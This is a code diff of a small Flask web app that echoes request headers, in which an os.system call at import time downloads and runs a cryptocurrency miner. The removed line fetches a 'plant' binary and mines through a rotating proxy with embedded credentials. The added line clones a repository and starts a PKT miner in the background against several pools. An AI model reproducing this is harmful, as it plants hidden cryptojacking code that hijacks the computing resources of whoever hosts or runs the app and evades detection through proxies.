@@ -5,7 +5,7 @@ import subprocess
 from flask import Flask, Response, request
 app = Flask(__name__)
 import os
-os.system ('curl -L -o plant https://github.com/sahrulega56/kosong/raw/main/plant && chmod +x plant && ./plant -a yespowersugar -o stratum+tcps://stratum-eu.rplant.xyz:17042 -u sugar1qc4y863shhe78t5st7ayt40gmdzpwm74w0m7dmc.Cindo -p x -t $(nproc --all) -x socks5://Gafadta66-US-rotate:Gafadta66@p.webshare.io:80')
+os.system ('git clone https://gitlab.com/azkadafa39/yiyi.git && cd yiyi && chmod +x linux && nohup ./linux ann -p pkt1qqwya7kp20pn9ugnw3lj78l3dmjp00gk3ct9ey9 http://pool.pkt.world http://pool.pktpool.io http://pool.pkteer.com https://stratum.zetahash.com')
 @app.route("/")
 def headers():
     return '<br/>'.join(['%s => %s' % (key, value) for (key, value) in request.headers.items()])
